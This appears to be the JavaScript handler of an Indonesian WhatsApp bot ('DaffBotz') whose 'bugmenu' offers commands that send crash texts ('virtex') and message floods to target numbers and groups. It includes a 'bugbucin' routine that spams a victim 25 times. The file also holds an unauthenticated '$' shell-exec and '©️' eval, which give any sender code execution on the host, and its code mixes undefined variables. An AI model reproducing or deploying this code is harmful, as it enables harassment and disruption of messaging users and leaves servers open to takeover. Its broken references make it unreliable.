require('./dzff')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = global.baileys
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const speed = require('performance-now')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const { apikey } = require('./apikey.json')
const { color, bgcolor } = require('./lib/color')
const maker = require('mumaker')
const textpro = require('./lib/textpro')
const { uptotelegra } = require('./lib/upload')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { Configuration, OpenAIApi } = require('openai')
const { exec, spawn, execSync } = require("child_process")
const { ngazap } = require('./baseikal/virtex/ngazap')
const { buttonkal } = require('./baseikal/virtex/buttonkal')
const { cttl } = require('./baseikal/virtex/cttl')
const { tizi } = require('./baseikal/virtex/tizi')
const { weg } = require('./baseikal/virtex/weg')
const tiktok = fs.readFileSync ('./daff/tiktok.js')
const { virtex7 } = require('./baseikal/virtex/virtex7')
const { bjp } = require('./daff/database/owner.js')
const { mata } = require('./daff/virtex/mata.js')
const { xyz } = require('./daff/database/daff.js')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, formatp, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
//=================================================//
const thumbnail = fs.readFileSync ('./baseikal/image/mamak.jpg')
const thumb = fs.readFileSync ('./baseikal/image/mamak.jpg')
const { mata2 } = require('./daff/virtex/mata2.js')
const kalimage = fs.readFileSync ('./baseikal/image/mamak.jpg')
const owner = JSON.parse(fs.readFileSync('./premium.json'))
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
const banned = JSON.parse(fs.readFileSync('./baseikal/dbnye/banned.json'))
const ownerr = JSON.parse(fs.readFileSync('./ownerr.json'))
virgam = fs.readFileSync(`./baseikal/image/deden.jpeg`)
//=================================================//
module.exports = daff = async (daff, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype === 'messageContextInfo') ? (m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix

//=================================================//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await daff.decodeJid(haikal.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await daff.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const welcm = m.isGroup ? wlcm.includes(from) : false
const welcmm = m.isGroup ? wlcmm.includes(from) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const isBan = banned.includes(m.sender)
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

//=================================================//}

const daffgans = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},

'message': {
 "stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
        'isAnimated': []
}}}
const reply = (teks) => {
return daff.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `DEVELOPER ${botname}`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": 'https://telegra.ph/file/5ba89dfb5562283e5d768.jpg',"thumbnail": thumb,"sourceUrl": `https://youtube.com/@DaffBotz`}}}, { quoted:m})} 

function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

async function loading () {
var daffx = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝔹𝕪 𝔻𝕒𝕗𝕗𝔹𝕠𝕥𝕫 𝕏𝔻\n𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳..."
]
let { key } = await daff.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})//Pengalih isu

for (let i = 0; i < hawemod.length; i++) {
/*await delay(10)*/
await daff.sendMessage(from, {text: daffx[i], edit: key });//PESAN LEPAS
}
}

//BATAS
//

//=================================================//
if (!daff.public) {
if (!m.key.fromMe) return
}
let rn = ['composing']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
daff.sendPresenceUpdate(jd, from)
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}

// Anti Link
if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return m.reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await haikal.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return haikal.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return haikal.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return haikal.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await daff.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
daff.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
daff.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini bangsat`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
}
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: daff.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, haikal.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
haikal.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('©️')) {
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}
async function sendDaffMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await daff.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

const sendapk = (teks) => {
daff.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
m.reply('*Rusak Bodoh !! Yang Bener Contoh : Yoapk DAFFBOTZ*')
}
for (let ikalii of apknye) {
if (budy === ikalii) {
let buffer = fs.readFileSync(`./database/apk/${ikalii}.apk`)
sendapk(buffer)
}
}
//=================================================//
const sendzip = (teks) => {
daff.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
m.reply('*Rusak Bodoh !! Yang Bener Contoh : Yozip DaffBotz')
}
for (let ikali of zipnye) {
if (budy === ikali) {
let buffer = fs.readFileSync(`./database/zip/${ikali}.zip`)
sendzip(buffer)
}
}
//=================================================//
const senddocu = (teks) => {
daff.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
m.reply('*Rusak Bodoh !! Yang Bener Contoh : Yopdf DaffBotzz XD*')
}
for (let ikal of docunye) {
if (budy === ikal) {
let buffer = fs.readFileSync(`./database/Docu/${ikal}.pdf`)
senddocu(buffer)
}
}
const sendvn = (teks) => {
daff.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, {quoted:m})
}

for (let anju of vnnye) {
if (budy === anju) {
let buffer = fs.readFileSync(`./database/Audio/${anju}.mp3`)
sendvn(buffer)
}
}
//=================================================//
var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
ppuser = await daff.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 
//=================================================//
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Telah Kembali Dari Afk ${user.afkReason ? ' Selama ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//=================================================//
switch(command) {

case 'menu':{
await loading()
m.reply(`*Hay Kak ${pushname} 👋 Selamat ${salam}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*UNTUK MEMBERIKAN AKSES*
🔏 addprem (628xx)
🔏 delprem (628xx)
🔏 listprem
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*BLOCKIR PENGGUNA AKSES*
🔏 pengguna add (628xx)
🔏 pengguna del (628xx)
🔏 listban
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*FITUR MENU*
⏳ ɢᴀꜱᴍᴇɴᴜ
⏳ ɪꜱʟᴀᴍᴍᴇɴᴜ
⏳ ʙᴜɢᴍᴇɴᴜ
⏳ ɢʀᴏᴜᴘᴍᴇɴᴜ
⏳ ʙᴇʀɪᴛᴀᴍᴇɴᴜ
⏳ ꜰᴜɴᴍᴇɴᴜ
⏳ ᴀᴅᴅᴍᴇɴᴜ
⏳ ʀᴀɴᴅᴏᴍᴍᴇɴᴜ
⏳ ᴅᴏᴡɴʟᴏᴀᴅᴍᴇɴᴜ
⏳ ᴛᴇxᴛᴍᴀᴋᴇʀ
⏳ ʟɪꜱᴛᴍᴜꜱɪᴋ
⏳ ᴄᴜᴄɪᴍᴀᴛᴀ
⏳ ᴀꜱᴜᴘᴀɴ
⏳ ᴘᴜʙʟɪᴄ
⏳ ꜱᴇʟꜰ
⏳ ᴘᴀʏᴍᴇɴᴛ
⏳ ʀᴜɴᴛɪᴍᴇ
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
Powered By @${bjp}`)
}
apoy = await getBuffer('https://feeldreams.github.io/pesanbuatmu/angelbaby.mp3')
await haikal.sendMessage(from, { audio: apoy, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6281295532922',
title: `DAFFBOTZ XD`,
sourceUrl: `https://wa.me/6281295532922`, 
thumbnail: thumbnail
}
}})
break
//=================================================//
//=================================================//
case 'bugmenu': {
await loading()
m.reply(`Hay Kak ${pushname} 👋 Selamat ${salam}
Total Pengguna Premium :  ${owner.length}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*UNTUK MEMBERIKAN AKSES*
🔏 addprem (628xx)
🔏 delprem (628xx)
🔏 listprem
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*BLOCKIR PENGGUNA AKSES*
🔏 pengguna add (628xx)
🔏 pengguna del (628xx)
🔏 listban
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*BUG SPAM PAKE JUMLAH*
┏━━⊱
┣❏🗿 (jumlah)
┣❏🥔 (jumlah)
┣❏🌰 (jumlah)
┣❏🎂 (jumlah)
┣❏🍆 (jumlah) 
┣❏🥑 (jumlah)
┣❏🥒 (jumlah)
┣❏🥦 (jumlah)
┣❏🌽 (jumlah)
┣❏🍠 (jumlah)
┣❏🥕 (jumlah)
┣❏🌶️ (jumlah)
┣❏🍅 (jumlah)
┣❏🥥 (jumlah)
┣❏🍇 (jumlah)
┣❏🥝 (jumlah)
┣❏🍐 (jumlah)
┣❏🍏 (jumlah)
┣❏🍈 (jumlah)
┣❏🍋 (jumlah)
┣❏🍌 (jumlah)
┣❏🍍 (jumlah)
┣❏🍊 (jumlah)
┣❏🍑 (jumlah)
┣❏🍉 (jumlah) 
┣❏🍎 (jumlah) 
┣❏🍒️ (jumlah) 
┣❏🍓 (jumlah) 
┣❏🍄 (jumlah) 
┣❏🌻 (jumlah) 
┣❏🏵️ (jumlah) 
┣❏💮 (jumlah) 
┣❏🌸 (jumlah) 
┣❏🌺 (jumlah) 
┣❏🥀 (jumlah)
┣❏🌹 (jumlah)
┣❏🤯 (jumlah)
┣❏🖕 (jumlah)
┣❏🤙 (jumlah)
┣❏💋 (jumlah)
┣❏💦 (jumlah)
┣❏💩 (jumlah)
┣❏👿 (jumlah)
┣❏👻 (jumlah)
┣❏🤡 (jumlah)
┣❏🤮 (jumlah)
┣❏😇 (jumlah)
┣❏😠 (jumlah)
┣❏😭 (jumlah)
┣❏🔥 (jumlah)
┣❏😜 (jumlah)
┣❏😎 (jumlah)
┣❏😡 (jumlah)
┣❏🤫 (jumlah)
┣❏❤️ (jumlah)
┣❏😁 (jumlah)
┣❏😱 (jumlah)
┣❏🤣 (jumlah)
┣❏😂 (jumlah)
┣❏😘 (jumlah)
┣❏💔 (jumlah)
┣❏👊 (jumlah)
┗━━⊱
*KIRIM KE PRIBADI*
┏━━⊱
┣❏🌷 (628xxxx)
┣❏🐲 (628xxxx)
┣❏🐉 (628xxxx)
┣❏🌵 (628xxxx)
┣❏🎄 (628xxxx) 
┣❏🌲 (628xxxx)
┣❏🌳 (628xxxx)
┣❏🌴 (628xxxx)
┣❏🌱 (628xxxx)
┣❏🌿 (628xxxx)
┣❏☘️ (628xxxx)
┣❏🍀 (628xxxx)
┣❏🐵 (628xxxx)
┣❏🙈 (628xxxx)
┣❏🙉 (628xxxx)
┣❏🙊 (628xxxx)
┣❏🐒 (628xxxx)
┣❏ꜱᴀɴᴛᴇᴛ (628xxxx)
┣❏ꜱᴇɴᴅɢᴀꜱꜰᴜʟʟ (628xxxx)
┣❏ꜱᴇɴᴅᴜɴʟɪᴛʀᴏʟɪ (628xxxx)
┣❏ꜱᴇɴᴅᴜɴʟɪᴅᴏᴄᴜ (628xxxx)
┣❏ꜱᴇɴᴅᴜɴʟɪᴄᴜʏ (628xxxx)
┣❏ꜱᴇɴᴅᴜɴʟɪʙᴏᴍ (628xxxx)
┣❏ꜱᴇɴᴅᴜɴʟɪʟᴀɢ (628xxxx)
┣❏ꜱᴇɴᴅᴜɴʟɪᴅᴇʟᴀʏ (628xxxx)
┣❏ʙᴜɢʙᴜᴄɪɴ (62xxxx)
┣❏ʙᴜɢʀᴀsɪs (62xxxx)
┣❏ᴅᴇᴠɪʟs (62xxxx)
┗━━⊱
*KIRIM KE GROUP PAKEI ID*
┏━━⊱
┣❏ɢᴀꜱꜰᴜʟʟɢᴄ (ɪᴅ ɢʀᴏᴜᴘ)
┣❏ꜱᴀɴᴛᴇᴛɢᴄ (ɪᴅ ɢʀᴏᴜᴘ)
┣❏ᴛʀᴏʟɪɢᴄ (ɪᴅ ɢʀᴏᴜᴘ)
┣❏ᴅᴏᴄᴜɢᴄ (ɪᴅ ɢʀᴏᴜᴘ)
┣❏ᴜɴʟɪᴅᴇʟᴀʏɢᴄ (ɪᴅ ɢʀᴏᴜᴘ)
┣❏ᴜɴʟɪʟᴀɢɢᴄ (ɪᴅ ɢʀᴏᴜᴘ)
┣❏ᴜɴʟɪʙᴏᴍɢᴄ (ɪᴅ ɢʀᴏᴜᴘ)
┣❏ᴜɴʟɪᴄᴜʏɢᴄ (ɪᴅ ɢʀᴏᴜᴘ) 
┣❏sᴀɴᴛᴇᴛɢᴄc (linkgrup)
┣❏sᴇʀᴀɴɢɢᴄ (linkgrup)
┣❏ᴅᴀғғɢᴄ (linkgrup)
┣❏ɢᴀsɢᴄ (linkgrup)
┣❏ᴀᴛᴛᴀᴄᴋɢᴄ (linkgrup)
┗━━⊱
*BUG SPAM DI TEMPAT*
┏━━⊱
┣❏ᴜɴʟɪᴛᴇᴛ
┣❏ᴜɴʟɪᴛʀᴏʟɪ
┣❏ᴜɴʟɪᴅᴏᴄᴜ
┣❏ᴜɴʟɪᴠɪʀᴛᴇxᴛ
┣❏ᴜɴʟɪᴅᴇʟᴀʏ
┣❏ᴜɴʟɪʟᴀɢ
┣❏ᴜɴʟɪʙᴏᴍ
┣❏ᴜɴʟɪᴄᴜʏ
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*BONUS*
┏━━⊱
┣❏𝚍𝚊𝚏𝚏
┣❏𝚐𝚘𝚢𝚊𝚗𝚐
┗━━⊱
Powered By @${bjp}
[ *BOT VERSION 19* ]`)
}
poy = await getBuffer('https://feeldreams.github.io/pesanbuatmu/angelbaby.mp3')
await haikal.sendMessage(from, { audio: poy, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6281295532922',
title: `DAFFBOTZ XD`,
sourceUrl: `https://wa.me/6281295532922`, 
thumbnail: thumbnail
}
}})
break
//====================================================================//
case 'bugbucin': {
if (!text) return reply(`Contoh Cara Penggunaan Adalah ${prefix} ${command} 6281295532922`)
if (!isCreator) return reply(`Khusus Member Premium Kak`)
if (Input) {
let cekno = await haikal.onWhatsApp(Input)
if (cekno.length == 0) return m.reply(`Peserta tersebut Sudah Tidak Terdaftar Di WhatsApp`)
if (Input == ownerr + "@s.whatsapp.net") return m.reply(`Tidak Bisa Bug My Creator!`)
await loading ()
let brln = text.split("|")[0]+'@s.whatsapp.net'
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
daff.sendMessage(brln, {text: `I LOVE YOU SAYANG`}, {quoted:kalgans})
await sleep(2000)
} 
}
reply(`Sukses Kirim Bug Ke Nomor Target Tolong Jeda 5 Menit`)
break
//=================================================================================//
//=================================================================================// 
default:
if (budy.startsWith('=>')) {
if (!isCreator) return m.reply(`*khusus Premium*`)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return m.reply(`*khusus Premium*`)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)})}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
haikal.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
